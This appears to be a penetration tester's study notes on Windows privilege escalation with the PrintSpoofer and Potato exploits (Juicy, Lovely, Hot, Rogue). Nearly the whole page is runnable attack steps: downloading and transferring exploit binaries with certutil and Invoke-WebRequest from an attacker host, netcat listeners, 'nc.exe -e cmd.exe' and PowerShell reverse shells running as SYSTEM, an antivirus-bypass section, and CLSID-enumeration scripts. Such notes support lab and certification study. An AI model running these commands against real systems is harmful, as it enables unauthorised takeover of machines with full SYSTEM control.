#### PrintSpoofer
**If Windows server, try PrintSpoofer!**

```command prompt - target
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
```

```
https://github.com/itm4n/PrintSpoofer/releases
```

Transfer to target.

[[4._File Transfers]]

[[rlwrap]]

Use either exe or ps1 for reverse shell:

[[1._Reverse Shells (WIN)#Stageless Payloads]]
```command prompt - target
PrintSpoofer64.exe -c "cmd /c powershell -c C:\Windows\Temp\Tools\reverse64.exe"
```

OR

[[1._Reverse Shells (WIN)#Powershell reverse TCP]]

OR

[[1._Reverse Shells (WIN)#PowerShell 1 liner]]

```command prompt - windows
PrintSpoofer64.exe -c "cmd /c powershell -c C:\Users\thecybergeek\AppData\Local\Temp\Shelly.ps1"
```

Start another listener on Kali.

[[rlwrap]]

5. Now run the PrintSpoofer exploit to trigger a reverse shell running with SYSTEM privileges:

```command prompt - windows
C:\PrivEsc\PrintSpoofer.exe –i -c "C:\PrivEsc\reverse.exe"
```

#### Juicy Potato-Lovely
```bash - kali
git clone https://github.com/TsukiCTF/Lovely-Potato && cd Lovely-Potato
```

[[Python#Server]]

[[1._Reverse Shells (WIN)#MSFVenom]]

MAKE SURE YOU HAVE ALL THESE FILES IN LOVELY-POTATO FOLDER:
- [ ] Invoke-LovelyPotato.ps1
- [ ] JuicyPotato-Static.exe
- [ ] test_clsid.bat
- [ ] reverse.exe

[[rlwrap]]

==OPEN AND FOLLOW THE README!!==

==Make sure you change all the variables needed!==

Invoke-LovelyPotato.ps1:

`$RemoteDir = "http://$KALI`
`$LocalPath = "[WritablePathOnVictimMachine]"`

Replace the first "meterpreter.exe" with "reverse{86/64}.exe" 

![[Pasted image 20211229211045.png]]

![[Pasted image 20220205162717.png]]

Transfer and execute Invoke-LovelyPotato.ps1 on the target.
![[2._Powershell  Bypass#Execution bypass]]

![[4._File Transfers#Powershell Download and execute]]

![[Pasted image 20211229211245.png]]

Now just wait, as this can take up to 10 mins:


![[Pasted image 20211229211526.png]]

Keep an eye on result.log if unable to determine if working.  Log will grow as it's working.

![[1._Reverse Shells (WIN)#MSFVenom#bat]]

![[rlwrap]]

```command prompt - windows
JuicyPotato.exe -t * -p shell.bat -l 4444
```


#### Hot Potato
Hot Potato is the name of an attack that uses a spoofing attack along with an NTLM relay attack to gain SYSTEM privileges. 

The attack tricks Windows into authenticating as the SYSTEM user to a fake HTTP server using NTLM. The NTLM credentials then get relayed to SMB in order to gain command execution.

This attack works on Windows 7, 8, early versions of Windows 10, and their server counterparts.

(Note: These steps are for Windows 7)

1. Copy the potato.exe exploit executable over to Windows.

2. Start a listener on Kali.

![[rlwrap]]

3. Run the exploit:

```command prompt - windows
.\potato.exe -ip $KALI -cmd "reverse.exe" -enable_httpserver true -enable_defender true -enable_spoof true - enable_exhaust true
```

4. Wait for a Windows Defender update, or trigger one manually.


#### Juicy Potato

[https://github.com/ohpe/juicy-potato](https://github.com/ohpe/juicy-potato)

####  64 / 32 bit downloads
```bash - kali
wget https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe
```

```bash - kali
wget https://github.com/ivanitlearning/Juicy-Potato-x86/releases/download/1.2/Juicy.Potato.x86.exe
```

(Note: These steps are for Windows 7)

1. Copy PSExec64.exe and the JuicyPotato.exe exploit executable over to Windows.

2. Start a listener on Kali.

![[rlwrap]]

3. Using an administrator command prompt, use PSExec64.exe to trigger a reverse shell running as the Local Service service account:

[[1._Reverse Shells (WIN)#MSFVenom]]

```command prompt - windows
C:\PrivEsc\PSExec64.exe -i -u "ntauthority\local service" C:\PrivEsc\reverse.exe
```

4. Start another listener on Kali.

![[rlwrap]]

5. Now run the JuicyPotato exploit to trigger a reverse shell running with SYSTEM privileges:

```command prompt - windows
C:\PrivEsc\JuicyPotato.exe -l 1337 -p C:\PrivEsc\reverse.exe -t * -c {03ca98d6-ff5d-49b8-abc6-03dd84127020}
```

6. If the CLSID ({03ca…) doesn’t work for you, either check this list:

[https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md](https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md)

or run the GetCLSID.ps1 PowerShell script.

#### NC Netcat bypass AntiVirus
```powershell - windows
Invoke-WebRequest -Uri 'http://$KALI/nc.exe -OutFile nc.exe'
```

```bash - kali
sudo rlwrap -cAr nc -lvnp 4444
```

```powershell - windows
.\JuicyPotato.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c C:\Users\kohsuke\AppData\Local\Temp\tools\nc.exe -e cmd.exe $KALI 4444" -t *
```

```command prompt - windows
JuicyPotato.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c C:\Users\kohsuke\AppData\Local\Temp\tools\nc.exe -e cmd.exe $KALI 4444" -t *
```

#### Juicy Potato Manual
Transfer JuicyPotato.exe, test_clsid.bat and CLSID.list to the victim, in the same folder.

![[Python#Server]]

```command prompt - windows
certutil -urlcache -split -f http://$KALI/JuicyPotato.exe && certutil -urlcache -split -f http://$KALI/test_clsid.bat && certutil -urlcache -split -f http://$KALI/CLSID.list
```

```command prompt - windows
.\test_clsid.bat
```

Open result.log

Select anyone CLSID from this list, make sure it had higher authority (NT AUTHORITY\SYSTEM)

[[1._Reverse Shells (WIN)#MSFVenom]]

Transfer reverse.exe to Victim.

![[4._File Transfers#Certutil]]


![[rlwrap]]

```command prompt - windows
JuicyPotato.exe -l 1337 -p reverse.exe -t * -c {687e55ca-6621–4c41-b9f1-c0eddc94bb05}
```


---


```bash - kali
cp Invoke-PowerShellTcp.ps1 shell-2.ps1
```

Mousepad shell-2.ps1, include the following at the bottom:

```
Invoke-PowerShellTcp -Reverse -IPAddress $KALI -Port 444
```

---

```bash - kali
mousepad shell.bat
```

```command prompt - windows
Invoke-WebRequest -Uri 'http://$KALI/shell-2.ps1' -OutFile shell-2.ps1
```

---

```powershell - windows
Invoke-WebRequest -Uri 'http://$KALI/shell.bat' -OutFile shell.bat
```

```bash - kali
sudo rlwrap -cAr nc -lvnp 444
```

```command prompt - windows
JuicyPotato.exe -t * -p shell.bat -l 4444
```

#### Rogue Potato
Latest of the “Potato” exploits.

GitHub: [https://github.com/antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)

Blog: [https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/)

Compiled Exploit:

[https://github.com/antonioCoco/RoguePotato/releases](https://github.com/antonioCoco/RoguePotato/releases)

1. Copy PSExec64.exe and the RoguePotato.exe exploit executable over to Windows.

2. Set up a socat redirector on Kali, forwarding Kali port 135 to port 9999 on Windows ($TARGET is the Windows IP):

```bash - windows
sudo socat tcp-listen:135,reuseaddr,fork tcp:$TARGET:9999
```

3. Start a listener on Kali.

![[rlwrap]]

4. Using an administrator command prompt, use PSExec64.exe to trigger a reverse shell running as the Local Service service account:

[[1._Reverse Shells (LIN)#MSFVenom]]

```command prompt - windows
C:\PrivEsc\PSExec64.exe /accepteula -i -u "ntauthority\local service" C:\PrivEsc\reverse.exe
```

5. Start another listener on Kali.

![[rlwrap]]

6. Now run the RoguePotato exploit to trigger a reverse shell running with SYSTEM privileges ($KALI is the Kali IP):

```command prompt - windows
C:\PrivEsc\RoguePotato.exe -r $KALI –l 9999 -e "C:\PrivEsc\reverse.exe"
```

#### test_clsid.bat

```command prompt - windows
@echo off
:: Starting port, you can change it
set /a port=10000
SETLOCAL ENABLEDELAYEDEXPANSION
FOR /F %%i IN (CLSID.list) DO (
 echo %%i !port!
 juicypotato.exe -z -l !port! -c %%i >> result.log
 set RET=!ERRORLEVEL!
 :: echo !RET!
 if "!RET!" == "1" set /a port=port+1
)
```

#### GetCLSID.ps1
```powershell - windows
<#
This script extracts CLSIDs and AppIDs related to LocalService.DESCRIPTION
Then exports to CSV
#>

$ErrorActionPreference = "Stop"

New-PSDrive -Name HKCR -PSProvider Registry -Root HKEY_CLASSES_ROOT

Write-Output "Looking for CLSIDs"
$CLSID = @()
Foreach($ID in (Get-ItemProperty HKCR:\clsid\* | select-object AppID,@{N='CLSID'; E={$_.pschildname}})){
    if ($ID.appid -ne $null){
        $CLSID += $ID
    }
}

Write-Output "Looking for APIDs"
$APPID = @()
Foreach($AID in (Get-ItemProperty HKCR:\appid\* | select-object localservice,@{N='AppID'; E={$_.pschildname}})){
    if ($AID.LocalService -ne $null){
        $APPID += $AID
    }
}

Write-Output "Joining CLSIDs and APIDs"
$RESULT = @()
Foreach ($app in $APPID){
    Foreach ($CLS in $CLSID){
        if($CLS.AppId -eq $app.AppID){
            $RESULT += New-Object psobject -Property @{
                AppId    = $app.AppId
                LocalService = $app.LocalService
                CLSID = $CLS.CLSID
            }

            break
        }
    }
}

$RESULT = $RESULT | Sort-Object LocalService

# Preparing to Output
$OS = (Get-WmiObject -Class Win32_OperatingSystem | ForEach-Object -MemberName Caption).Trim() -Replace "Microsoft ", ""
$TARGET = $OS -Replace " ","_"

# Make target folder
New-Item -ItemType Directory -Force -Path .\$TARGET

# Output in a CSV
$RESULT | Export-Csv -Path ".\$TARGET\CLSIDs.csv" -Encoding ascii -NoTypeInformation

# Export CLSIDs list
$RESULT | Select CLSID -ExpandProperty CLSID | Out-File -FilePath ".\$TARGET\CLSID.list" -Encoding ascii

# Visual Table
$RESULT | ogv
```

